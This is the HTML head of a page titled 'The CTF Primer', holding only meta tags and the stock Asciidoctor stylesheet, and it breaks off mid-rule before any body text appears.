<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="generator" content="Asciidoctor 2.0.16">
    <meta name="author" content="Samuel Sabogal Pardo, et al.">
    <title>The CTF Primer</title>
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
    <style>
        /*! Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
        /* Uncomment the following line when using as a custom stylesheet */
        /* @import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700"; */
        html {
            font-family: sans-serif;
            -webkit-text-size-adjust: 100%
        }

        a {
            background: none
        }

        a:focus {
            outline: thin dotted
        }

        a:active,
        a:hover {
            outline: 0
        }

        h1 {
            font-size: 2em;
            margin: .67em 0
        }

        b,
        strong {
            font-weight: bold
        }

        abbr {
            font-size: .9em
        }

        abbr[title] {
            cursor: help;
            border-bottom: 1px dotted #dddddf;
            text-decoration: none
        }

        dfn {
            font-style: italic
        }

        hr {
            height: 0
        }

        mark {
            background: #ff0;
            color: #000
        }

        code,
        kbd,
        pre,
        samp {
            font-family: monospace;
            font-size: 1em
        }

        pre {
            white-space: pre-wrap
        }

        q {
            quotes: "\201C" "\201D" "\2018" "\2019"
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sup {
            top: -.5em
        }

        sub {
            bottom: -.25em
        }

        img {
            border: 0
        }

        svg:not(:root) {
            overflow: hidden
        }

        figure {
            margin: 0
        }

        audio,
        video {
            display: inline-block
        }

        audio:not([controls]) {
            display: none;
            height: 0
        }

        fieldset {
            border: 1px solid silver;
            margin: 0 2px;
            padding: .35em .625em .75em
        }

        legend {
            border: 0;
            padding: 0
        }

        button,
        input,
        select,
        textarea {
            font-family: inherit;
            font-size: 100%;
            margin: 0
        }

        button,
        input {
            line-height: normal
        }

        button,
        select {
            text-transform: none
        }

        button,
        html input[type=button],
        input[type=reset],
        input[type=submit] {
            -webkit-appearance: button;
            cursor: pointer
        }

        button[disabled],
        html input[disabled] {
            cursor: default
        }

        input[type=checkbox],
        input[type=radio] {
            padding: 0
        }

        button::-moz-focus-inner,
        input::-moz-focus-inner {
            border: 0;
            padding: 0
        }

        textarea {
            overflow: auto;
            vertical-align: top
        }

        table {
            border-collapse: collapse;
            border-spacing: 0
        }

        *,
        ::before,
        ::after {
            box-sizing: border-box
        }

        html,
        body {
            font-size: 100%
        }

        body {
            background: #fff;
            color: rgba(0, 0, 0, .8);
            padding: 0;
            margin: 0;
            font-family: "Noto Serif", "DejaVu Serif", serif;
            line-height: 1;
            position: relative;
            cursor: auto;
            -moz-tab-size: 4;
            -o-tab-size: 4;
            tab-size: 4;
            word-wrap: anywhere;
            -moz-osx-font-smoothing: grayscale;
            -webkit-font-smoothing: antialiased
        }

        a:hover {
            cursor: pointer
        }

        img,
        object,
        embed {
            max-width: 100%;
            height: auto
        }

        object,
        embed {
            height: 100%
        }

        img {
            -ms-interpolation-mode: bicubic
        }

        .left {
            float: left !important
        }

        .right {
            float: right !important
        }

        .text-left {
            text-align: left !important
        }

        .text-right {
            text-align: right !important
        }

        .text-center {
            text-align: center !important
        }

        .text-justify {
            text-align: justify !important
        }

        .hide {
            display: none
        }

        img,
        object,
        svg {
            display: inline-block;
            vertical-align: middle
        }

        textarea {
            height: auto;
            min-height: 50px
        }

        select {
            width: 100%
        }

        .subheader,
        .admonitionblock td.content>.title,
        .audioblock>.title,
        .exampleblock>.title,
        .imageblock>.title,
        .listingblock>.title,
        .literalblock>.title,
        .stemblock>.title,
        .openblock>.title,
        .paragraph>.title,
        .quoteblock>.title,
        table.tableblock>.title,
        .verseblock>.title,
        .videoblock>.title,
        .dlist>.title,
        .olist>.title,
        .ulist>.title,
        .qlist>.title,
        .hdlist>.title {
            line-height: 1.45;
            color: #7a2518;
            font-weight: 400;
            margin-top: 0;
            margin-bottom: .25em
        }

        div,
        dl,
        dt,
        dd,
        ul,
        ol,
        li,
        h1,
        h2,
        h3,
        #toctitle,
        .sidebarblock>.content>.title,
        h4,
        h5,
        h6,
        pre,
        form,
        p,
        blockquote,
        th,
        td {
            margin: 0;
            padding: 0
        }

        a {
            color: #2156a5;
            text-decoration: underline;
            line-height: inherit
        }

        a:hover,
        a:focus {
            color: #1d4b8f
        }

        a img {
            border: 0
        }

        p {
            line-height: 1.6;
            margin-bottom: 1.25em;
            text-rendering: optimizeLegibility
        }

        p aside {
            font-size: .875em;
            line-height: 1.35;
            font-style: italic
        }

        h1,
        h2,
        h3,
        #toctitle,
        .sidebarblock>.content>.title,
        h4,
        h5,
        h6 {
            font-family: "Open Sans", "DejaVu Sans", sans-serif;
            font-weight: 300;
            font-style: normal;
            color: #ba3925;
            text-rendering: optimizeLegibility;
            margin-top: 1em;
            margin-bottom: .5em;
            line-height: 1.0125em
        }

        h1 small,
        h2 small,
        h3 small,
        #toctitle small,
        .sidebarblock>.content>.title small,
        h4 small,
        h5 small,
        h6 small {
            font-size: 60%;
            color: #e99b8f;
            line-height: 0
        }

        h1 {
            font-size: 2.125em
        }

        h2 {
            font-size: 1.6875em
        }

        h3,
        #toctitle,
        .sidebarblock>.content>.title {
            font-size: 1.375em
        }

        h4,
        h5 {
            font-size: 1.125em
        }

        h6 {
            font-size: 1em
        }

        hr {
            border: solid #dddddf;
            border-width: 1px 0 0;
            clear: both;
            margin: 1.25em 0 1.1875em
        }

        em,
        i {
            font-style: italic;
            line-height: inherit
        }

        strong,
        b {
            font-weight: bold;
            line-height: inherit
        }

        small {
            font-size: 60%;
            line-height: inherit
        }

        code {
            font-family: "Droid Sans Mono", "DejaVu Sans Mono", monospace;
            font-weight: 400;
            color: rgba(0, 0, 0, .9)
        }

        ul,
        ol,
        dl {
            line-height: 1.6;
            margin-bottom: 1.25em;
            list-style-position: outside;
            font-family: inherit
        }

        ul,
        ol {
            margin-left: 1.5em
        }

        ul li ul,
        ul li ol {
            margin-left: 1.25em;
            margin-bottom: 0
        }

        ul.square li ul,
        ul.circle li ul,
        ul.disc li ul {
            list-style: inherit
        }

        ul.square {
            list-style-type: square
        }

        ul.circle {
            list-style-type: circle
        }

        ul.disc {
            list-style-type: disc
        }

        ol li ul,
        ol li ol {
            margin-left: 1.25em;
            margin-bottom: 0
        }

        dl dt {
            margin-bottom: .3125em;
            font-weight: bold
        }

        dl dd {
            margin-bottom: 1.25em
        }

        blockquote {
            margin: 0 0 1.25em;
            padding: .5625em 1.25em 0 1.1875em;
            border-left: 1px solid #ddd
        }

        blockquote,
        blockquote p {
            line-height: 1.6;
            color: rgba(0, 0, 0, .85)
        }

        @media screen and (min-width:768px) {

            h1,
            h2,
            h3,
            #toctitle,
            .sidebarblock>.content>.title,
            h4,
            h5,
            h6 {
                line-height: 1.2
            }

            h1 {
                font-size: 2.75em
            }

            h2 {
                font-size: 2.3125em
            }

            h3,
            #toctitle,
            .sidebarblock>.content>.title {
                font-size: 1.6875em
            }

            h4 {
                font-size: 1.4375em
            }
        }

        table {
            background: #fff;
            margin-bottom: 1.25em;
            border: 1px solid #dedede;
            word-wrap: normal
        }

        table thead,
        table tfoot {
            background: #f7f8f7
        }

        table thead tr th,
        table thead tr td,
        table tfoot tr th,
        table tfoot tr td {
            padding: .5em .625em .625em;
            font-size: inherit;
            color: rgba(0, 0, 0, .8);
            text-align: left
        }

        table tr th,
        table tr td {
            padding: .5625em .625em;
            font-size: inherit;
            color: rgba(0, 0, 0, .8)
        }

        table tr.even,
        table tr.alt {
            background: #f8f8f7
        }

        table thead tr th,
        table tfoot tr th,
        table tbody tr td,
        table tr td,
        table tfoot tr td {
            line-height: 1.6
        }

        h1,
        h2,
        h3,
        #toctitle,
        .sidebarblock>.content>.title,
        h4,
        h5,
        h6 {
            line-height: 1.2;
            word-spacing: -.05em
        }

        h1 strong,
        h2 strong,
        h3 strong,
        #toctitle strong,
        .sidebarblock>.content>.title strong,
        h4 strong,
        h5 strong,
        h6 strong {
            font-weight: 400
        }

        .center {
            margin-left: auto;
            margin-right: auto
        }

        .stretch {
            width: 100%
        }

        .clearfix::before,
        .clearfix::after,
        .float-group::before,
        .float-group::after {
            content: " ";
            display: table
        }

        .clearfix::after,
        .float-group::after {
            clear: both
        }

        :not(pre).nobreak {
            word-wrap: normal
        }

        :not(pre).nowrap {
            white-space: nowrap
        }

        :not(pre).pre-wrap {
            white-space: pre-wrap
        }

        :not(pre):not([class^=L])>code {
            font-size: .9375em;
            font-style: normal !important;
            letter-spacing: 0;
            padding: .1em .5ex;
            word-spacing: -.15em;
            background: #f7f7f8;
            border-radius: 4px;
            line-height: 1.45;
            text-rendering: optimizeSpeed
        }

        pre {
            color: rgba(0, 0, 0, .9);
            font-family: "Droid Sans Mono", "DejaVu Sans Mono", monospace;
            line-height: 1.45;
            text-rendering: optimizeSpeed
        }

        pre code,
        pre pre {
            color: inherit;
            font-size: inherit;
            line-height: inherit
        }

        pre>code {
            display: block
        }

        pre.nowrap,
        pre.nowrap pre {
            white-space: pre;
            word-wrap: normal
        }

        em em {
            font-style: normal
        }

        strong strong {
            font-weight: 400
        }

        .keyseq {
            color: rgba(51, 51, 51, .8)
        }

        kbd {
            font-family: "Droid Sans Mono", "DejaVu Sans Mono", monospace;
            display: inline-block;
            color: rgba(0, 0, 0, .8);
            font-size: .65em;
            line-height: 1.45;
            background: #f7f7f7;
            border: 1px solid #ccc;
            border-radius: 3px;
            box-shadow: 0 1px 0 rgba(0, 0, 0, .2), inset 0 0 0 .1em #fff;
            margin: 0 .15em;
            padding: .2em .5em;
            vertical-align: middle;
            position: relative;
            top: -.1em;
            white-space: nowrap
        }

        .keyseq kbd:first-child {
            margin-left: 0
        }

        .keyseq kbd:last-child {
            margin-right: 0
        }

        .menuseq,
        .menuref {
            color: #000
        }

        .menuseq b:not(.caret),
        .menuref {
            font-weight: inherit
        }

        .menuseq {
            word-spacing: -.02em
        }

        .menuseq b.caret {
            font-size: 1.25em;
            line-height: .8
        }

        .menuseq i.caret {
            font-weight: bold;
            text-align: center;
            width: .45em
        }

        b.button::before,
        b.button::after {
            position: relative;
            top: -1px;
            font-weight: 400
        }

        b.button::before {
            content: "[";
            padding: 0 3px 0 2px
        }

        b.button::after {
            content: "]";
            padding: 0 2px 0 3px
        }

        p a>code:hover {
            color: rgba(0, 0, 0, .9)
        }

        #header,
        #content,
        #footnotes,
        #footer {
            width: 100%;
            margin: 0 auto;
            max-width: 62.5em;
            *zoom: 1;
            position: relative;
            padding-left: .9375em;
            padding-right: .9375em
        }

        #header::before,
        #header::after,
        #content::before,
        #content::after,
        #footnotes::before,
        #footnotes::after,
        #footer::before,
        #footer::after {
            content: " ";
            display: table
        }

        #header::after,
        #content::after,
        #footnotes::after,
        #footer::after {
            clear: both
        }

        #content {
            margin-top: 1.25em
        }

        #content::before {
            content: none
        }

        #header>h1:first-child {
            color: rgba(0, 0, 0, .85);
            margin-top: 2.25rem;
            margin-bottom: 0
        }

        #header>h1:first-child+#toc {
            margin-top: 8px;
            border-top: 1px solid #dddddf
        }

        #header>h1:only-child,
        body.toc2 #header>h1:nth-last-child(2) {
            border-bottom: 1px solid #dddddf;
            padding-bottom: 8px
        }

        #header .details {
            border-bottom: 1px solid #dddddf;
            line-height: 1.45;
            padding-top: .25em;
            padding-bottom: .25em;
            padding-left: .25em;
            color: rgba(0, 0, 0, .6);
            display: flex;
            flex-flow: row wrap
        }

        #header .details span:first-child {
            margin-left: -.125em
        }

        #header .details span.email a {
            color: rgba(0, 0, 0, .85)
        }

        #header .details br {
            display: none
        }

        #header .details br+span::before {
            content: "\00a0\2013\00a0"
        }

        #header .details br+span.author::before {
            content: "\00a0\22c5\00a0";
            color: rgba(0, 0, 0, .85)
        }

        #header .details br+span#revremark::before {
            content: "\00a0|\00a0"
        }

        #header #revnumber {
            text-transform: capitalize
        }

        #header #revnumber::after {
            content: "\00a0"
        }

        #content>h1:first-child:not([class]) {
            color: rgba(0, 0, 0, .85);
            border-bottom: 1px solid #dddddf;
            padding-bottom: 8px;
            margin-top: 0;
            padding-top: 1rem;
            margin-bottom: 1.25rem
        }

        #toc {
            border-bottom: 1px solid #e7e7e9;
            padding-bottom: .5em
        }

        #toc>ul {
            margin-left: .125em
        }

        #toc ul.sectlevel0>li>a {
            font-style: italic
        }

        #toc ul.sectlevel0 ul.sectlevel1 {
            margin: .5em 0
        }

        #toc ul {
            font-family: "Open Sans", "DejaVu Sans", sans-serif;
            list-style-type: none
        }

        #toc li {
            line-height: 1.3334;
            margin-top: .3334em
        }

        #toc a {
            text-decoration: none
        }

        #toc a:active {
            text-decoration: underline
        }

        #toctitle {
            color: #7a2518;
            font-size: 1.2em
        }

        @media screen and (min-width:768px) {
            #toctitle {
                font-size: 1.375em
            }

            body.toc2 {
                padding-left: 15em;
                padding-right: 0
            }

            #toc.toc2 {
                margin-top: 0 !important;
                background: #f8f8f7;
                position: fixed;
                width: 15em;
                left: 0;
                top: 0;
                border-right: 1px solid #e7e7e9;
                border-top-width: 0 !important;
                border-bottom-width: 0 !important;
                z-index: 1000;
                padding: 1.25em 1em;
                height: 100%;
                overflow: auto
            }

            #toc.toc2 #toctitle {
                margin-top: 0;
                margin-bottom: .8rem;
                font-size: 1.2em
            }

            #toc.toc2>ul {
                font-size: .9em;
                margin-bottom: 0
            }

            #toc.toc2 ul ul {
                margin-left: 0;
                padding-left: 1em
            }

            #toc.toc2 ul.sectlevel0 ul.sectlevel1 {
                padding-left: 0;
                margin-top: .5em;
                margin-bottom: .5em
            }

            body.toc2.toc-right {
                padding-left: 0;
                padding-right: 15em
            }

            body.toc2.toc-right #toc.toc2 {
                border-right-width: 0;
                border-left: 1px solid #e7e7e9;
                left: auto;
                right: 0
            }
        }

        @media screen and (min-width:1280px) {
            body.toc2 {
                padding-left: 20em;
                padding-right: 0
            }

            #toc.toc2 {
                width: 20em
            }

            #toc.toc2 #toctitle {
                font-size: 1.375em
            }

            #toc.toc2>ul {
                font-size: .95em
            }

            #toc.toc2 ul ul {
                padding-left: 1.25em
            }

            body.toc2.toc-right {
                padding-left: 0;
                padding-right: 20em
            }
        }

        #content #toc {
            border: 1px solid #e0e0dc;
            margin-bottom: 1.25em;
            padding: 1.25em;
            background: #f8f8f7;
            border-radius: 4px
        }

        #content #toc>:first-child {
            margin-top: 0
        }

        #content #toc>:last-child {
            margin-bottom: 0
        }

        #footer {
            max-width: none;
            background: rgba(0, 0, 0, .8);
            padding: 1.25em
        }

        #footer-text {
            color: hsla(0, 0%, 100%, .8);
            line-height: 1.44
        }

        #content {
            margin-bottom: .625em
        }

        .sect1 {
            padding-bottom: .625em
        }

        @media screen and (min-width:768px) {
            #content {
                margin-bottom: 1.25em
            }

            .sect1 {
                padding-bottom: 1.25em
            }
        }

        .sect1:last-child {
            padding-bottom: 0
        }

        .sect1+.sect1 {
            border-top: 1px solid #e7e7e9
        }

        #content h1>a.anchor,
        h2>a.anchor,
        h3>a.anchor,
        #toctitle>a.anchor,
        .sidebarblock>.content>.title>a.anchor,
        h4>a.anchor,
        h5>a.anchor,
        h6>a.anchor {
            position: absolute;
            z-index: 1001;
            width: 1.5ex;
            margin-left: -1.5ex;
            display: block;
            text-decoration: none !important;
            visibility: hidden;
            text-align: center;
            font-weight: 400
        }

        #content h1>a.anchor::before,
        h2>a.anchor::before,
        h3>a.anchor::before,
        #toctitle>a.anchor::before,
        .sidebarblock>.content>.title>a.anchor::before,
        h4>a.anchor::before,
        h5>a.anchor::before,
        h6>a.anchor::before {
            content: "\00A7";
            font-size: .85em;
            display: block;
            padding-top: .1em
        }

        #content h1:hover>a.anchor,
        #content h1>a.anchor:hover,
        h2:hover>a.anchor,
        h2>a.anchor:hover,
        h3:hover>a.anchor,
        #toctitle:hover>a.anchor,
        .sidebarblock>.content>.title:hover>a.anchor,
        h3>a.anchor:hover,
        #toctitle>a.anchor:hover,
        .sidebarblock>.content>.title>a.anchor:hover,
        h4:hover>a.anchor,
        h4>a.anchor:hover,
        h5:hover>a.anchor,
        h5>a.anchor:hover,
        h6:hover>a.anchor,
        h6>a.anchor:hover {
            visibility: visible
        }

        #content h1>a.link,
        h2>a.link,
        h3>a.link,
        #toctitle>a.link,
        .sidebarblock>.content>.title>a.link,
        h4>a.link,
        h5>a.link,
        h6>a.link {
            color: #ba3925;
            text-decoration: none
        }

        #content h1>a.link:hover,
        h2>a.link:hover,
        h3>a.link:hover,
        #toctitle>a.link:hover,
        .sidebarblock>.content>.title>a.link:hover,
        h4>a.link:hover,
        h5>a.link:hover,
        h6>a.link:hover {
            color: #a53221
        }

        details,
        .audioblock,
        .imageblock,
        .literalblock,
        .listingblock,
        .stemblock,
        .videoblock {
            margin-bottom: 1.25em
        }

        details {
            margin-left: 1.25rem
        }

        details>summary {
            cursor: pointer;
            display: block;
            position: relative;
            line-height: 1.6;
            margin-bottom: .625rem;
            -webkit-tap-highlight-color: transparent
        }

        details>summary::before {
            content: "";
            border: solid transparent;
            border-left: solid;
            border-width: .3em 0 .3em .5em;
            position: absolute;
            top: .5em;
            left: -1.25rem;
            transform: translateX(15%)
        }

        details[open]>summary::before {
            border: solid transparent;
            border-top: solid;
            border-width: .5em .3em 0;
            transform: translateY(15%)
        }

        details>summary::after {
            content: "";
            width: 1.25rem;
            height: 1em;
            position: absolute;
            top: .3em;
            left: -1.25rem
        }

        .admonitionblock td.content>.title,
        .audioblock>.title,
        .exampleblock>.title,
        .imageblock>.title,
        .listingblock>.title,
        .literalblock>.title,
        .stemblock>.title,
        .openblock>.title,
        .paragraph>.title,
        .quoteblock>.title,
        table.tableblock>.title,
        .verseblock>.title,
        .videoblock>.title,
        .dlist>.title,
        .olist>.title,
        .ulist>.title,
        .qlist>.title,
        .hdlist>.title {
            text-rendering: optimizeLegibility;
            text-align: left;
            font-family: "Noto Serif", "DejaVu Serif", serif;
            font-size: 1rem;
            font-style: italic
        }

        table.tableblock.fit-content>caption.title {
            white-space: nowrap;
            width: 0
        }

        .paragraph.lead>p,
        #preamble>.sectionbody>[class=paragraph]:first-of-type p {
            font-size: 1.21875em;
            line-height: 1.6;
            color: rgba(0, 0, 0, .85)
        }

        .admonitionblock>table {
            border-collapse: separate;
            border: 0;
            background: none;
            width: 100%
        }

        .admonitionblock>table td.icon {
            text-align: center;
            width: 80px
        }

        .admonitionblock>table td.icon img {
            max-width: none
        }

        .admonitionblock>table td.icon .title {
            font-weight: bold;
            font-family: "Open Sans", "DejaVu Sans", sans-serif;
            text-transform: uppercase
        }

        .admonitionblock>table td.content {
            padding-left: 1.125em;
            padding-right: 1.25em;
            border-left: 1px solid #dddddf;
            color: rgba(0, 0, 0, .6);
            word-wrap: anywhere
        }

        .admonitionblock>table td.content>:last-child>:last-child {
            margin-bottom: 0
        }

        .exampleblock>.content {
            border: 1px solid #e6e6e6;
            margin-bottom: 1.25em;
            padding: 1.25em;
            background: #fff;
            border-radius: 4px
        }

        .exampleblock>.content>:first-child {
            margin-top: 0
        }

        .exampleblock>.content>:last-child {
            margin-bottom: 0
        }

        .sidebarblock {
            border: 1px solid #dbdbd6;
            margin-bottom: 1.25em;
            padding: 1.25em;
            background: #f3f3f2;
            border-radius: 4px
        }

        .sidebarblock>:first-child {
            margin-top: 0
        }

        .sidebarblock>:last-child {
            margin-bottom: 0
        }

        .sidebarblock>.content>.title {
            color: #7a2518;
            margin-top: 0;
            text-align: center
        }

        .exampleblock>.content>:last-child>:last-child,
        .exampleblock>.content .olist>ol>li:last-child>:last-child,
        .exampleblock>.content .ulist>ul>li:last-child>:last-child,
        .exampleblock>.content .qlist>ol>li:last-child>:last-child,
        .sidebarblock>.content>:last-child>:last-child,
        .sidebarblock>.content .olist>ol>li:last-child>:last-child,
        .sidebarblock>.content .ulist>ul>li:last-child>:last-child,
        .sidebarblock>.content .qlist>ol>li:last-child>:last-child {
            margin-bottom: 0
        }

        .literalblock pre,
        .listingblock>.content>pre {
            border-radius: 4px;
            overflow-x: auto;
            padding: 1em;
            font-size: .8125em
        }

        @media screen and (min-width:768px) {

            .literalblock pre,
            .listingblock>.content>pre {
                font-size: .90625em
            }
        }

        @media screen and (min-width:1280px) {

            .literalblock pre,
            .listingblock>.content>pre {
                font-size: 1em
            }
        }

        .literalblock pre,
        .listingblock>.content>pre:not(.highlight),
        .listingblock>.content>pre[class=highlight],
        .listingblock>.content>pre[class^="highlight "] {
            background: #f7f7f8
        }

        .literalblock.output pre {
            color: #f7f7f8;
            background: rgba(0, 0, 0, .9)
        }

        .listingblock>.content {
            position: relative
        }

        .listingblock code[data-lang]::before {
            display: none;
            content: attr(data-lang);
            position: absolute;
            font-size: .75em;
            top: .425rem;
            right: .5rem;
            line-height: 1;
            text-transform: uppercase;
            color: inherit;
            opacity: .5
        }

        .listingblock:hover code[data-lang]::before {
            display: block
        }

        .listingblock.terminal pre .command::before {
            content: attr(data-prompt);
            padding-right: .5em;
            color: inherit;
            opacity: .5
        }

        .listingblock.terminal pre .command:not([data-prompt])::before {
            content: "$"
        }

        .listingblock pre.highlightjs {
            padding: 0
        }

        .listingblock pre.highlightjs>code {
            padding: 1em;
            border-radius: 4px
        }

        .listingblock pre.prettyprint {
            border-width: 0
        }

        .prettyprint {
            background: #f7f7f8
        }

        pre.prettyprint .linenums {
            line-height: 1.45;
            margin-left: 2em
        }

        pre.prettyprint li {
            background: none;
            list-style-type: inherit;
            padding-left: 0
        }

        pre.prettyprint li code[data-lang]::before {
            opacity: 1
        }

        pre.prettyprint li:not(:first-child) code[data-lang]::before {
            display: none
        }

        table.linenotable {
            border-collapse: separate;
            border: 0;
            margin-bottom: 0;
            background: none
        }

        table.linenotable td[class] {
            color: inherit;
            vertical-align: top;
            padding: 0;
            line-height: inherit;
            white-space: normal
        }

        table.linenotable td.code {
            padding-left: .75em
        }

        table.linenotable td.linenos {
            border-right: 1px solid;
            opacity: .35;
            padding-right: .5em
        }

        pre.pygments .lineno {
            border-right: 1px solid;
            opacity: .35;
            display: inline-block;
            margin-right: .75em
        }

        pre.pygments .lineno::before {
            content: "";
            margin-right: -.125em
        }

        .quoteblock {
            margin: 0 1em 1.25em 1.5em;
            display: table
        }

        .quoteblock:not(.excerpt)>.title {
            margin-left: -1.5em;
            margin-bottom: .75em
        }

        .quoteblock blockquote,
        .quoteblock p {
            color: rgba(0, 0, 0, .85);
            font-size: 1.15rem;
            line-height: 1.75;
            word-spacing: .1em;
            letter-spacing: 0;
            font-style: italic;
            text-align: justify
        }

        .quoteblock blockquote {
            margin: 0;
            padding: 0;
            border: 0
        }

        .quoteblock blockquote::before {
            content: "\201c";
            float: left;
            font-size: 2.75em;
            font-weight: bold;
            line-height: .6em;
            margin-left: -.6em;
            color: #7a2518;
            text-shadow: 0 1px 2px rgba(0, 0, 0, .1)
        }

        .quoteblock blockquote>.paragraph:last-child p {
            margin-bottom: 0
        }

        .quoteblock .attribution {
            margin-top: .75em;
            margin-right: .5ex;
            text-align: right
        }

        .verseblock {
            margin: 0 1em 1.25em
        }

        .verseblock pre {
            font-family: "Open Sans", "DejaVu Sans", sans-serif;
            font-size: 1.15rem;
            color: rgba(0, 0, 0, .85);
            font-weight: 300;
            text-rendering: optimizeLegibility
        }

        .verseblock pre strong {
            font-weight: 400
        }

        .verseblock .attribution {
            margin-top: 1.25rem;
            margin-left: .5ex
        }

        .quoteblock .attribution,
        .verseblock .attribution {
            font-size: .9375em;
            line-height: 1.45;
            font-style: italic
        }

        .quoteblock .attribution br,
        .verseblock .attribution br {
            display: none
        }

        .quoteblock .attribution cite,
        .verseblock .attribution cite {
            display: block;
            letter-spacing: -.025em;
            color: rgba(0, 0, 0, .6)
        }

        .quoteblock.abstract blockquote::before,
        .quoteblock.excerpt blockquote::before,
        .quoteblock .quoteblock blockquote::before {
            display: none
        }

        .quoteblock.abstract blockquote,
        .quoteblock.abstract p,
        .quoteblock.excerpt blockquote,
        .quoteblock.excerpt p,
        .quoteblock .quoteblock blockquote,
        .quoteblock .quoteblock p {
            line-height: 1.6;
            word-spacing: 0
        }

        .quoteblock.abstract {
            margin: 0 1em 1.25em;
            display: block
        }

        .quoteblock.abstract>.title {
            margin: 0 0 .375em;
            font-size: 1.15em;
            text-align: center
        }

        .quoteblock.excerpt>blockquote,
        .quoteblock .quoteblock {
            padding: 0 0 .25em 1em;
            border-left: .25em solid #dddddf
        }

        .quoteblock.excerpt,
        .quoteblock .quoteblock {
            margin-left: 0
        }

        .quoteblock.excerpt blockquote,
        .quoteblock.excerpt p,
        .quoteblock .quoteblock blockquote,
        .quoteblock .quoteblock p {
            color: inherit;
            font-size: 1.0625rem
        }

        .quoteblock.excerpt .attribution,
        .quoteblock .quoteblock .attribution {
            color: inherit;
            font-size: .85rem;
            text-align: left;
            margin-right: 0
        }

        p.tableblock:last-child {
            margin-bottom: 0
        }

        td.tableblock>.content {
            margin-bottom: 1.25em;
            word-wrap: anywhere
        }

        td.tableblock>.content>:last-child {
            margin-bottom: -1.25em
        }

        table.tableblock,
        th.tableblock,
        td.tableblock {
            border: 0 solid #dedede
        }

        table.grid-all>*>tr>* {
            border-width: 1px
        }

        table.grid-cols>*>tr>* {
            border-width: 0 1px
        }

        table.grid-rows>*>tr>* {
            border-width: 1px 0
        }

        table.frame-all {
            border-width: 1px
        }

        table.frame-ends {
            border-width: 1px 0
        }

        table.frame-sides {
            border-width: 0 1px
        }

        table.frame-none>colgroup+*>:first-child>*,
        table.frame-sides>colgroup+*>:first-child>* {
            border-top-width: 0
        }

        table.frame-none>:last-child>:last-child>*,
        table.frame-sides>:last-child>:last-child>* {
            border-bottom-width: 0
        }

        table.frame-none>*>tr>:first-child,
        table.frame-ends>*>tr>:first-child {
            border-left-width: 0
        }

        table.frame-none>*>tr>:last-child,
        table.frame-ends>*>tr>:last-child {
            border-right-width: 0
        }

        table.stripes-all tr,
        table.stripes-odd tr:nth-of-type(odd),
        table.stripes-even tr:nth-of-type(even),
        table.stripes-hover tr:hover {
            background: #f8f8f7
        }

        th.halign-left,
        td.halign-left {
            text-align: left
        }

        th.halign-right,
        td.halign-right {
            text-align: right
        }

        th.halign-center,
        td.halign-center {
            text-align: center
        }

        th.valign-top,
        td.valign-top {
            vertical-align: top
        }

        th.valign-bottom,
        td.valign-bottom {
            vertical-align: bottom
        }

        th.valign-middle,
        td.valign-middle {
            vertical-align: middle
        }

        table thead th,
        table tfoot th {
            font-weight: bold
        }

        tbody tr th {
            background: #f7f8f7
        }

        tbody tr th,
        tbody tr th p,
        tfoot tr th,
        tfoot tr th p {
            color: rgba(0, 0, 0, .8);
            font-weight: bold
        }

        p.tableblock>code:only-child {
            background: none;
            padding: 0
        }

        p.tableblock {
            font-size: 1em
        }

        ol {
            margin-left: 1.75em
        }

        ul li ol {
            margin-left: 1.5em
        }

        dl dd {
            margin-left: 1.125em
        }

        dl dd:last-child,
        dl dd:last-child>:last-child {
            margin-bottom: 0
        }

        ol>li p,
        ul>li p,
        ul dd,
        ol dd,
        .olist .olist,
        .ulist .ulist,
        .ulist .olist,
        .olist .ulist {
            margin-bottom: .625em
        }

        ul.checklist,
        ul.none,
        ol.none,
        ul.no-bullet,
        ol.no-bullet,
        ol.unnumbered,
        ul.unstyled,
        ol.unstyled {
            list-style-type: none
        }

        ul.no-bullet,
        ol.no-bullet,
        ol.unnumbered {
            margin-left: .625em
        }

        ul.unstyled,
        ol.unstyled {
            margin-left: 0
        }

        ul.checklist>li>p:first-child {
            margin-left: -1em
        }

        ul.checklist>li>p:first-child>.fa-square-o:first-child,
        ul.checklist>li>p:first-child>.fa-check-square-o:first-child {
            width: 1.25em;
            font-size: .8em;
            position: relative;
            bottom: .125em
        }

        ul.checklist>li>p:first-child>input[type=checkbox]:first-child {
            margin-right: .25em
        }

        ul.inline {
            display: flex;
            flex-flow: row wrap;
            list-style: none;
            margin: 0 0 .625em -1.25em
        }

        ul.inline>li {
            margin-left: 1.25em
        }

        .unstyled dl dt {
            font-weight: 400;
            font-style: normal
        }

        ol.arabic {
            list-style-type: decimal
        }

        ol.decimal {
            list-style-type: decimal-leading-zero
        }

        ol.loweralpha {
            list-style-type: lower-alpha
        }

        ol.upperalpha {
            list-style-type: upper-alpha
        }

        ol.lowerroman {
            list-style-type: lower-roman
        }

        ol.upperroman {
            list-style-type: upper-roman
        }

        ol.lowergreek {
            list-style-type: lower-greek
        }

        .hdlist>table,
        .colist>table {
            border: 0;
            background: none
        }

        .hdlist>table>tbody>tr,
        .colist>table>tbody>tr {
            background: none
        }

        td.hdlist1,
        td.hdlist2 {
            vertical-align: top;
            padding: 0 .625em
        }

        td.hdlist1 {
            font-weight: bold;
            padding-bottom: 1.25em
        }

        td.hdlist2 {
            word-wrap: anywhere
        }

        .literalblock+.colist,
        .listingblock+.colist {
            margin-top: -.5em
        }

        .colist td:not([class]):first-child {
            padding: .4em .75em 0;
            line-height: 1;
            vertical-align: top
        }

        .colist td:not([class]):first-child img {
            max-width: none
        }

        .colist td:not([class]):last-child {
            padding: .25em 0
        }

        .thumb,
        .th {
            line-height: 0;
            display: inline-block;
            border: 4px solid #fff;
            box-shadow: 0 0 0 1px #ddd
        }

        .imageblock.left {
            margin: .25em .625em 1.25em 0
        }

        .imageblock.right {
            margin: .25em 0 1.25em .625em
        }

        .imageblock>.title {
            margin-bottom: 0
        }

        .imageblock.thumb,
        .imageblock.th {
            border-width: 6px
        }

        .imageblock.thumb>.title,
        .imageblock.th>.title {
            padding: 0 .125em
        }

        .image.left,
        .image.right {
